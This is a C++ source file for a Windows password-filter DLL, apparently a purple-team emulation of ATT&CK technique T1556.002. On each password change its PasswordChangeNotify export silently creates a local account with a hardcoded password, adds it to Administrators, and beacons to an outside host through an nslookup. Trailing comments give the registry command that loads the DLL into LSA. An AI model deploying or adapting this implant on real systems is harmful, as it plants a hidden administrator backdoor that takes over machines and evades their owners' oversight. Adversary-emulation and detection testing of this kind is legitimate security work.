#include "pch.h"

#include <stdio.h>
#include <windows.h>
#include <LM.h>
#include <string>
#include <SubAuth.h>

int addUserTechnique(void)
{
    USER_INFO_1 ui;
    LOCALGROUP_MEMBERS_INFO_3 account;
    NET_API_STATUS ret;
    NET_API_STATUS Status;

    memset(&ui, 0, sizeof(ui));
    memset(&account, 0, sizeof(account));

    std::string technique = "T1556_002";
    wchar_t wtext[20];
    mbstowcs(wtext, technique.c_str(), technique.length() + 1);//includes null
    LPWSTR utech = wtext;

    ui.usri1_name = utech;

    std::string password = "purpleteam.ru";
    wchar_t ptext[20];
    mbstowcs(ptext, password.c_str(), password.length() + 1);//includes null
    LPWSTR upass = ptext;

    ui.usri1_password = upass;
    ui.usri1_home_dir = NULL;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;

    ret = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if (ret != NERR_Success)
    {
        return 0;
    }
    account.lgrmi3_domainandname = ui.usri1_name;
    Status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
    if (Status != NERR_Success)
    {
        return 0;
    }
    return 1;
}

extern "C" __declspec(dllexport) BOOLEAN WINAPI InitializeChangeNotify(void)
{
    return TRUE;
}

extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword)
{
    addUserTechnique();
    system("cmd /c nslookup -type=any T1556.purpleteam.ru");

    return TRUE;
}

extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation)
{
    return TRUE;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
// REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0T1556_002" /f
